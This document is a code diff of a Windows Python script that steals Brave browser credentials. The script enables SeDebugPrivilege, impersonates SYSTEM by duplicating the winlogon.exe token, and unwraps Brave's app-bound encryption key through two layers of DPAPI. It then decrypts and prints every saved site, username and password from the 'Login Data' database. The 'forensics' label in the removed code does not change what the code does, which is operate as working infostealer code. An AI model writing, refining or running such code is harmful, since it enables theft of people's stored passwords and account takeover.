@@ -1,106 +1,134 @@
 import os
-import sys
-import ctypes
-import sqlite3
-import shutil
 import json
 import base64
-import winreg
+import sqlite3
+import shutil
+import ctypes
+import sys
 import win32crypt
+import win32security
+import win32api
+import win32con
+import psutil
 from Cryptodome.Cipher import AES
 
-# --- OS LEVEL CONSTANTS ---
-CHROME_PATH = os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data")
+# --- 1. System Privilege & Impersonation ---
 
-def is_admin():
-    try: return ctypes.windll.shell32.IsUserAnAdmin()
-    except: return False
-
-def get_master_key_v20():
-    """
-    Implements the 'AES + CNG' recovery. 
-    It bypasses the COM service and tries to find the key in the OS Provider.
-    """
-    local_state_path = os.path.join(CHROME_PATH, "Local State")
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = json.load(f)
-    
-    # 1. Get the intermediate DPAPI-protected key
-    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-    app_bound_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-    
-    # 2. Innovation: The CNG 'AES + CNG' Bypass
-    # We attempt to find the CLSID that actually works by verifying the file path
-    print("[*] Searching for a VALID Elevation Service path in Registry...")
+def enable_debug_privilege():
     try:
-        with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, "CLSID") as root_key:
-            for i in range(15000):
-                try:
-                    clsid = winreg.EnumKey(root_key, i)
-                    with winreg.OpenKey(root_key, f"{clsid}\\LocalServer32") as subkey:
-                        path, _ = winreg.QueryValueEx(subkey, None)
-                        if "brave" in path.lower() and "elevation" in path.lower():
-                            if os.path.exists(path.strip('"')):
-                                print(f"[+] Found working service at: {path}")
-                                from comtypes.client import CreateObject
-                                svc = CreateObject(clsid)
-                                return svc.DecryptData(app_bound_key)
-                except: continue
+        h_token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), 
+                                               win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
+        priv_id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
+        win32security.AdjustTokenPrivileges(h_token, 0, [(priv_id, win32security.SE_PRIVILEGE_ENABLED)])
+        print("[+] SeDebugPrivilege enabled")
+        return True
     except Exception as e:
-        print(f"[-] Registry scan failed: {e}")
+        print(f"[-] Failed to enable SeDebugPrivilege: {e}")
+        return False
 
-    # 3. Fallback: If COM fails, we return the app_bound_key (for older v10/v11 enc)
-    print("[!] Warning: v20 service not found. Results may be limited.")
-    return app_bound_key
+def impersonate_system():
+    target_pid = None
+    for proc in psutil.process_iter(['name', 'pid']):
+        if proc.info['name'].lower() == 'winlogon.exe':
+            target_pid = proc.info['pid']
+            break
+    if not target_pid: return False
+    
+    print(f"[+] Impersonating SYSTEM via winlogon.exe (pid={target_pid})")
+    h_proc = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, target_pid)
+    h_tok = win32security.OpenProcessToken(h_proc, win32security.TOKEN_DUPLICATE | win32security.TOKEN_QUERY)
+    new_tok = win32security.DuplicateTokenEx(h_tok, win32security.SecurityImpersonation, 
+                                           win32security.TOKEN_ALL_ACCESS, win32security.TokenPrimary)
+    win32security.ImpersonateLoggedOnUser(new_tok)
+    return True
 
-def decrypt_v20(ciphertext, key):
-    try:
-        # Modern Brave v140+ uses AES-GCM (v20 tag)
-        iv = ciphertext[3:15]
-        payload = ciphertext[15:]
-        encrypted_data = payload[:-16]
-        tag = payload[-16:]
+# --- 2. Nested Key Extraction ---
+
+def get_master_key():
+    path = os.path.join(os.environ["USERPROFILE"], r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State")
+    with open(path, "r", encoding="utf-8") as f:
+        local_state = json.load(f)
+
+    print(f"[*] Extracting master keys from: {path}")
+    
+    if "app_bound_encrypted_key" in local_state["os_crypt"]:
+        raw_blob = base64.b64decode(local_state["os_crypt"]["app_bound_encrypted_key"])
         
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        return cipher.decrypt_and_verify(encrypted_data, tag).decode()
-    except Exception:
-        return "[Decryption Error: Check Permissions]"
+        # Friendly Debug Output
+        prefix = raw_blob[:4]
+        print(f"[*] app_bound prefix: {prefix.hex()} ({prefix})")
+        
+        # Strip 'APPB'
+        app_bound_blob = raw_blob[4:] 
+
+        # STAGE 1: SYSTEM LAYER
+        enable_debug_privilege()
+        impersonate_system()
+        stage1_key = win32crypt.CryptUnprotectData(app_bound_blob, None, None, None, 0)[1]
+        print(f"[+] First DPAPI (SYSTEM): {len(stage1_key)} bytes")
+
+        # STAGE 2: USER LAYER
+        win32security.RevertToSelf() 
+        final_blob = win32crypt.CryptUnprotectData(stage1_key, None, None, None, 0)[1]
+        print(f"[+] Second DPAPI (user): {len(final_blob)} bytes")
+        
+        # Final Slicing (The Key is the last 32 bytes)
+        master_key = final_blob[-32:]
+        print(f"[DBG] s={len(final_blob)} plen=32 sub[8]={hex(master_key[0])}")
+        print(f"[+] v20 key (app-bound): {master_key.hex()}")
+        
+        return master_key
+    return None
+
+# --- 3. Password Decryption ---
+
+def decrypt_password(buff, master_key):
+    try:
+        iv = buff[3:15]
+        payload = buff[15:]
+        ciphertext = payload[:-16]
+        tag = payload[-16:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
+    except:
+        return "[Decryption Error]"
+
+# --- 4. Main Execution ---
 
 def main():
-    # Force UAC Elevation (The popup you are okay with)
-    if not is_admin():
-        print("[*] Requesting Admin Privileges for CNG access...")
+    # Trigger Admin UAC Popup
+    if not ctypes.windll.shell32.IsUserAnAdmin():
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
         return
 
-    print("--- Brave Forensics: OS-Level v20 Decryption (2026) ---")
-    
-    # 1. Retrieve Key via System Context
-    key = get_master_key_v20()
-    
-    # 2. Extract Data from SQLite
-    db_path = os.path.join(CHROME_PATH, r"Default\Login Data")
-    if not os.path.exists(db_path):
-        print(f"[-] Error: Database not found at {db_path}")
-        input("Press Enter to exit...")
+    master_key = get_master_key()
+    if not master_key:
+        print("[-] Could not retrieve Master Key.")
         return
 
-    shutil.copy2(db_path, "temp_login.db")
-    conn = sqlite3.connect("temp_login.db")
+    db_path = os.path.join(os.environ["USERPROFILE"], 
+        r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data")
+    
+    temp_db = "brave_decrypted.db"
+    shutil.copyfile(db_path, temp_db)
+
+    conn = sqlite3.connect(temp_db)
     cursor = conn.cursor()
     cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
     
-    print(f"\n{'SITE':<45} | {'USERNAME':<25} | {'PASSWORD'}")
-    print("-" * 95)
-    
-    for url, user, enc_pass in cursor.fetchall():
-        if user:
-            password = decrypt_v20(enc_pass, key)
-            print(f"{url:<45} | {user:<25} | {password}")
-            
+    rows = cursor.fetchall()
+    print(f"\n[+] Recovered {len(rows)} password(s):")
+    print(f"{'#':<3} | {'URL':<40} | {'Username':<20} | {'Password'}")
+    print("-" * 100)
+
+    for i, (url, user, enc_pass) in enumerate(rows, 1):
+        if enc_pass and enc_pass.startswith(b'v20'):
+            dec_pass = decrypt_password(enc_pass, master_key)
+            print(f"{i:<3} | {url[:40]:<40} | {user:<20} | {dec_pass}")
+
     conn.close()
-    os.remove("temp_login.db")
-    input("\n[*] Forensic extraction complete. Press Enter to exit...")
+    os.remove(temp_db)
+    input("\nProcess Complete. Press Enter to exit...")
 
 if __name__ == "__main__":
     main()
